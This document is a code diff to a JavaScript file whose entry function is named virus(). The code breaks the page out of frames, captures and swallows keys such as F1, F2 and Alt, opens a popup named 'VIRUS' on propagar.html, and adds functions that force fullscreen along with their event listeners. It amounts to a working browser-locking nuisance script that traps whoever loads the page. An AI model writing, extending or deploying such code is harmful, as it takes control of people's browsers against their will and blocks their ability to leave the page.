@@ -4,13 +4,13 @@ function virus(){
 
 	bloqueo();
 	maximizar();
-	cargaPaginas();
+	//cargaPaginas();
 }
 
 function bloqueo(){
 if(top.location != self.location)
   top.location = self.location;
-shortcut.add("s",function() {
+shortcut.add("F1",function() {
 });
 shortcut.add("F2",function() {
 });
@@ -45,8 +45,7 @@ shortcut.add("Alt",function() {
 function maximizar(){
 
 	var w= Math.floor(Math.random() * 100); 
-	window.open("propagar.html", "VIRUS", "width=100" , "height=100");
-	
+	window.open("propagar.html", "VIRUS");
 }
 
 function cargaPaginas(){
@@ -56,3 +55,47 @@ function cargaPaginas(){
  }
 
 }
+
+// Find the right method, call on correct element
+function launchFullscreen() {
+  if(document.requestFullscreen) {
+    document.requestFullscreen();
+  } else if(document.mozRequestFullScreen) {
+    document.mozRequestFullScreen();
+  } else if(document.webkitRequestFullscreen) {
+    document.webkitRequestFullscreen();
+  } else if(document.msRequestFullscreen) {
+    document.msRequestFullscreen();
+  }
+}
+
+function exitFullscreen() {
+  if(document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if(document.mozCancelFullScreen) {
+    document.mozCancelFullScreen();
+  } else if(document.webkitExitFullscreen) {
+    document.webkitExitFullscreen();
+  }
+}
+
+function dumpFullscreen() {
+  console.log("document.fullscreenElement is: ", document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement);
+  console.log("document.fullscreenEnabled is: ", document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled);
+}
+
+// Events
+document.addEventListener("fullscreenchange", function(e) {
+  console.log("fullscreenchange event! ", e);
+});
+document.addEventListener("mozfullscreenchange", function(e) {
+  console.log("mozfullscreenchange event! ", e);
+});
+document.addEventListener("webkitfullscreenchange", function(e) {
+  console.log("webkitfullscreenchange event! ", e);
+});
+document.addEventListener("msfullscreenchange", function(e) {
+  console.log("msfullscreenchange event! ", e);
+});
+
+// Add different events for fullscreen
